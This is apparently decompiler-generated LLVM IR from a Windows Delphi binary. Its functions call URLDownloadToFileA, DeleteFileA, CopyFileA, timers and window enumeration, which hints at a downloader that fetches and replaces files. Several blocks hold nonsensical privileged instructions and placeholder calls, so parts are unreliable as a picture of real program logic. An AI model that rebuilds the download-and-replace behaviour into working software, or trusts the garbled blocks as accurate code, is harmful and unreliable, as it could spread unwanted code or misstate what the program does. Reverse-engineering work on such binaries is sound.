  %42 = call i32 @function_406f2c(i32 4218000, i32 2000, i32 -1), !insn.addr !1111
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1112
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1112
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1113
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1113
  %46 = icmp eq i1 %45, false, !insn.addr !1114
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1115
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1115

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1116
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1116
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1117
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1117
  br label %dec_label_pc_405c7a, !insn.addr !1117

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1118
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1118
  %51 = load i32, i32* %50, align 4, !insn.addr !1118
  ret i32 %51, !insn.addr !1119
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1120
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1120
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1120
  store i8 %6, i8* %7, align 1, !insn.addr !1120
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1121
  %10 = udiv i32 %4, 256, !insn.addr !1121
  %11 = trunc i32 %10 to i8, !insn.addr !1121
  %12 = add i8 %9, %11, !insn.addr !1121
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1121
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1121
  store i8 %12, i8* %14, align 1, !insn.addr !1121
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1122
  %17 = add i32 %4, 6, !insn.addr !1122
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1122
  %19 = zext i1 %16 to i32, !insn.addr !1122
  %20 = and i32 %4, -65536, !insn.addr !1122
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1123
  %23 = or i1 %16, %22, !insn.addr !1123
  %24 = add i32 %18, 6, !insn.addr !1123
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1123
  %26 = zext i1 %23 to i32, !insn.addr !1123
  %27 = and i32 %25, 15, !insn.addr !1123
  %28 = or i32 %27, %20, !insn.addr !1123
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1123
  %31 = or i32 %28, %30, !insn.addr !1123
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1124
  %33 = load i8, i8* %32, align 1, !insn.addr !1124
  %34 = trunc i32 %27 to i8, !insn.addr !1124
  %35 = xor i8 %33, %34, !insn.addr !1124
  store i8 %35, i8* %32, align 1, !insn.addr !1124
  %36 = add i32 %0, 1311123697, !insn.addr !1125
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1125
  %38 = load i8, i8* %37, align 1, !insn.addr !1125
  %39 = udiv i32 %3, 256, !insn.addr !1125
  %40 = trunc i32 %39 to i8, !insn.addr !1125
  %41 = add i8 %38, %40, !insn.addr !1125
  store i8 %41, i8* %37, align 1, !insn.addr !1125
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1126
  %43 = load i32, i32* %42, align 4, !insn.addr !1126
  %44 = sub i32 %43, %31, !insn.addr !1126
  store i32 %44, i32* %42, align 4, !insn.addr !1126
  %45 = add i32 %3, 117, !insn.addr !1127
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1127
  %47 = load i8, i8* %46, align 1, !insn.addr !1127
  %48 = add i8 %47, %34, !insn.addr !1127
  %49 = icmp eq i8 %48, 0, !insn.addr !1127
  store i8 %48, i8* %46, align 1, !insn.addr !1127
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1128

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1129
  %51 = trunc i32 %3 to i16, !insn.addr !1130
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1130
  %53 = load i32, i32* %52, align 4, !insn.addr !1130
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1130
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1131
  %55 = load i8, i8* %54, align 1, !insn.addr !1131
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1131
  %56 = load i8, i8* %32, align 1, !insn.addr !1132
  %57 = add i8 %56, %34, !insn.addr !1132
  store i8 %57, i8* %32, align 1, !insn.addr !1132
  %58 = call i32 @__asm_iretd(), !insn.addr !1133
  %59 = add i32 %2, -117, !insn.addr !1134
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1134
  %61 = load i8, i8* %60, align 1, !insn.addr !1134
  %62 = add i8 %61, -69, !insn.addr !1134
  store i8 %62, i8* %60, align 1, !insn.addr !1134
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1135
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1136
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1136
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1136
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1137
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1138
  %67 = add i32 %66, 1, !insn.addr !1138
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1138
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1139
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1140
  ret i32 0, !insn.addr !1141

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1142
  store i32 %69, i32* %ebx, align 4, !insn.addr !1143
  %70 = icmp slt i32 %69, 0, !insn.addr !1144
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1145

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1146
  store i32 %71, i32* %ebx, align 4, !insn.addr !1146
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1147
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1148
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1149
  %75 = call i32 @function_403c90(), !insn.addr !1150
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1151
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1152
  br label %dec_label_pc_405d79, !insn.addr !1152

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1153
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1154
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1154
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1154
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1155
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1156
  %3 = add i32 %2, 1, !insn.addr !1156
  %4 = icmp eq i32 %3, 0, !insn.addr !1156
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1156
  %5 = icmp eq i1 %4, false, !insn.addr !1157
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1157

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1158
  br label %dec_label_pc_405da9, !insn.addr !1158

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1159
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1160
  ret i32 0, !insn.addr !1161
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1162
  ret i32 %0, !insn.addr !1162
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1163
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1164
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1165
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1165
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1165
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1166
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1167
  %3 = add i32 %2, -1, !insn.addr !1167
  %4 = icmp eq i32 %2, 0, !insn.addr !1167
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1167
  %5 = icmp eq i1 %4, false, !insn.addr !1168
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1168

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1169
  br label %dec_label_pc_405df4, !insn.addr !1170

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1171
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1172
  ret i32 0, !insn.addr !1173
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1174
  ret i32 %0, !insn.addr !1174
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1175
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1176
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1177
  %.reg2mem = alloca i8, !insn.addr !1177
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1177
  %5 = trunc i32 %2 to i8, !insn.addr !1178
  %6 = and i8 %5, 31, !insn.addr !1178
  %7 = icmp eq i8 %6, 0, !insn.addr !1178
  br i1 %7, label %dec_label_pc_405e0c._crit_edge, label %9, !insn.addr !1178

dec_label_pc_405e0c._crit_edge:                   ; preds = %dec_label_pc_405e0c
  %8 = trunc i32 %0 to i8
  store i8 %8, i8* %.reg2mem
  br label %14

; <label>:9:                                      ; preds = %dec_label_pc_405e0c
  %10 = add i32 %1, -959064636, !insn.addr !1178
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1178
  %12 = load i8, i8* %11, align 1, !insn.addr !1178
  %13 = shl i8 %12, %6, !insn.addr !1178
  store i8 %13, i8* %11, align 1, !insn.addr !1178
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  store i8 %.pre, i8* %.reg2mem, !insn.addr !1178
  br label %14, !insn.addr !1178

; <label>:14:                                     ; preds = %dec_label_pc_405e0c._crit_edge, %9
  %.reload = load i8, i8* %.reg2mem, !insn.addr !1179
  %15 = zext i8 %.reload to i32, !insn.addr !1179
  %16 = and i32 %3, -256, !insn.addr !1179
  %17 = or i32 %16, %15, !insn.addr !1179
  %18 = inttoptr i32 %17 to i8*, !insn.addr !1180
  %19 = load i8, i8* %18, align 1, !insn.addr !1180
  %factor = mul i8 %.reload, 30
  %20 = add i8 %factor, %19, !insn.addr !1181
  store i8 %20, i8* %18, align 1, !insn.addr !1181
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1182
  store i32 %arg1, i32* %esi, align 4, !insn.addr !1183
  %21 = call i32 @__readfsdword(i32 0), !insn.addr !1184
  store i32 %21, i32* %stack_var_-48, align 4, !insn.addr !1184
  %22 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1184
  call void @__writefsdword(i32 0, i32 %22), !insn.addr !1185
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1186
  %23 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1186
  %24 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1187
  %25 = icmp eq i32 %24, 32770, !insn.addr !1188
  %26 = icmp eq i1 %25, false, !insn.addr !1189
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1189
  br i1 %26, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1189

dec_label_pc_405e88:                              ; preds = %14
  %27 = call i32 @function_407020(), !insn.addr !1190
  %28 = call i32 @"@LStrPos"(), !insn.addr !1191
  %29 = call i32 @"@LStrPos"(), !insn.addr !1192
  %30 = add i32 %29, -1, !insn.addr !1193
  %31 = icmp slt i32 %30, 0, !insn.addr !1194
  %32 = add i32 %28, 2, !insn.addr !1195
  %33 = icmp sgt i32 %32, %30, !insn.addr !1196
  %or.cond = or i1 %31, %33
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1197
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1197

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %34 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1198
  store i32 %34, i32* %stack_var_-60, align 4, !insn.addr !1198
  %35 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1198
  %36 = call i32 @"@LStrCopy"(), !insn.addr !1199
  %37 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1200
  %38 = icmp eq i32 %37, 0, !insn.addr !1200
  store i32 %35, i32* %esp.0.reg2mem, !insn.addr !1201
  br i1 %38, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1201

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %39 = call i32 @function_406e08(), !insn.addr !1202
  %40 = call i32 @"@LStrFromPChar"(), !insn.addr !1203
  %41 = call i32 @"@LStrCat"(), !insn.addr !1204
  %42 = call i32 @function_4036c8(), !insn.addr !1205
  %43 = inttoptr i32 %42 to i8*, !insn.addr !1206
  %44 = call i1 @DeleteFileA(i8* %43), !insn.addr !1207
  %45 = call i32 @function_4036c8(), !insn.addr !1208
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1209
  store i8* %46, i8** %stack_var_-76, align 4, !insn.addr !1209
  %47 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1209
  %48 = call i1 @CopyFileA(i8* %46, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1210
  %49 = call i32 @function_405b70(), !insn.addr !1211
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1211
  br label %dec_label_pc_405f34, !insn.addr !1211

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %14
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1212
  %51 = load i32, i32* %50, align 4, !insn.addr !1212
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1213
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1214
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1214
  store i32 4218710, i32* %53, align 4, !insn.addr !1214
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1215
  ret i32 %54, !insn.addr !1216
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1217
  ret i32 %0, !insn.addr !1217
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1218
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1219
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1219
  %3 = load i32, i32* %2, align 4, !insn.addr !1219
  ret i32 %3, !insn.addr !1220
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1221
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1221
  store i32 %1, i32* %2, align 4, !insn.addr !1221
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1222
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1222
  %7 = add i8 %4, %6, !insn.addr !1222
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1222
  store i8 %7, i8* %8, align 1, !insn.addr !1222
  %9 = load i32, i32* %eax, align 4, !insn.addr !1223
  ret i32 %9, !insn.addr !1223
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1224
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1224
  store i8 %4, i8* %5, align 1, !insn.addr !1224
  %6 = mul i32 %0, 4096, !insn.addr !1225
  %7 = udiv i32 %0, 1048576, !insn.addr !1225
  %8 = or i32 %7, %6, !insn.addr !1225
  %9 = and i32 %0, 1048576, !insn.addr !1225
  %10 = icmp eq i32 %9, 0, !insn.addr !1225
  %11 = load i32, i32* %edx, align 4, !insn.addr !1226
  %12 = trunc i32 %11 to i16, !insn.addr !1226
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1226
  %14 = sext i8 %13 to i32, !insn.addr !1226
  %15 = or i32 %2, %14, !insn.addr !1226
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1227
  %17 = and i32 %15, -256, !insn.addr !1227
  %18 = or i32 %17, %16, !insn.addr !1227
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1228
  %20 = load i8, i8* %19, align 1, !insn.addr !1228
  %21 = mul i8 %20, 2, !insn.addr !1228
  %22 = lshr i8 %20, 7, !insn.addr !1228
  %23 = or i8 %22, %21, !insn.addr !1228
  store i8 %23, i8* %19, align 1, !insn.addr !1228
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1229
  %26 = udiv i32 %1, 256, !insn.addr !1229
  %27 = trunc i32 %26 to i8, !insn.addr !1229
  %28 = add i8 %25, %27, !insn.addr !1229
  %29 = load i32, i32* %edx, align 4, !insn.addr !1229
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1229
  store i8 %28, i8* %30, align 1, !insn.addr !1229
  %31 = add i32 %8, -4, !insn.addr !1230
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1230
  store i32 4218448, i32* %32, align 4, !insn.addr !1230
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1231
  %34 = sext i1 %33 to i32, !insn.addr !1231
  ret i32 %34, !insn.addr !1232
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1233
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1233
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1233
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1234
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1235
  %3 = add i32 %2, 1, !insn.addr !1235
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1235
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1236
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1237
  ret i32 0, !insn.addr !1238
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1239
  ret i32 %0, !insn.addr !1239
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1240
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1241
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1242
  %2 = add i32 %1, -1, !insn.addr !1242
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1242
  ret i32 %0, !insn.addr !1243
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1244
  %0 = call i32 @function_40603c(), !insn.addr !1245
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1246
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1247
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1247

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1248
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1249
  %5 = load i32, i32* %4, align 4, !insn.addr !1249
  %6 = icmp eq i32 %5, 0, !insn.addr !1249
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1250
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1250

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1251
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1252
  unreachable, !insn.addr !1252

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1253
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1254
  %1 = icmp eq i32 %0, 0, !insn.addr !1254
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1255

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1256
  br label %dec_label_pc_40601a, !insn.addr !1256

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1257
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1258
  %5 = load i32, i32* %4, align 4, !insn.addr !1258
  %6 = mul i32 %5, 1000, !insn.addr !1258
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1259
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1260
  ret i32 %7, !insn.addr !1261
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1262
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1262
  %1 = icmp eq i32 %0, 0, !insn.addr !1262
  store i32 %0, i32* %.reg2mem, !insn.addr !1263
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1263

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1263
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1263
  br label %dec_label_pc_406045, !insn.addr !1263

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1264
  ret i32 %.reload, !insn.addr !1265
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1266
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1267
  ret i32 %1, !insn.addr !1268
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1269
  %1 = icmp eq i32 %0, 0, !insn.addr !1269
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1270

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1271
  br label %dec_label_pc_406076, !insn.addr !1271

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1272
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1273
  ret i32 %3, !insn.addr !1274
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1275
  ret i32 %0, !insn.addr !1276
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1277
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1277
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1277
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1278
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1279
  %3 = add i32 %2, 1, !insn.addr !1279
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1279
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1280
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1281
  ret i32 0, !insn.addr !1282
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1283
  ret i32 %0, !insn.addr !1283
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1284
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1285
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1286
  %2 = add i32 %1, -1, !insn.addr !1286
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1286
  ret i32 %0, !insn.addr !1287
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1288
  ret i32 %0, !insn.addr !1288
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1289
  %ebx.0.reg2mem = alloca i32, !insn.addr !1289
  %0 = call i32 @__decompiler_undefined_function_0()
